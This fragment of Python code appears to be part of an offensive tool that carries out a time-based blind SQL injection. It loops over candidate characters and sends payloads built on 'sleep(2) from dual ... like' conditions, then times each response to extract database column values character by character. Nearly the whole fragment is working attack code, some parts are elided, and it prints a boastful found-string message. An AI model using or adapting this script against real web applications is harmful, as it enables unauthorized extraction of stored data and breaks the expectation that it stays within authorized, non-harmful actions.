...
for ii in word_text:
    time.sleep(0.1)
    #print(i)
    print("TRY FIRST STRING data in column_db ===> "+ii)
    inject = "1' and (select sleep(2) from dual where (select "+columns_db+" from "+table_db+" where "+columns_db+" like '"+ii+"%' limit 0,1) like '%')-- -"
    ...
    if(a.elapsed.total_seconds() > 2 ):
        ...
        while(chay == "chay"):
            ...
            for i in word_text:
                ...
                inject = "1' and (select sleep(2) from dual where (select "+columns_db+" from "+table_db+" where "+columns_db+" like '"+name_dumpdb+"%' limit 0,1) like '%')-- -"
                ...
                if(a.elapsed.total_seconds() > 2 ):
                    ...
                    print("FOUND STRING name BY VHAE :D ==>  "+name_dumpdb[:-1])
                    break
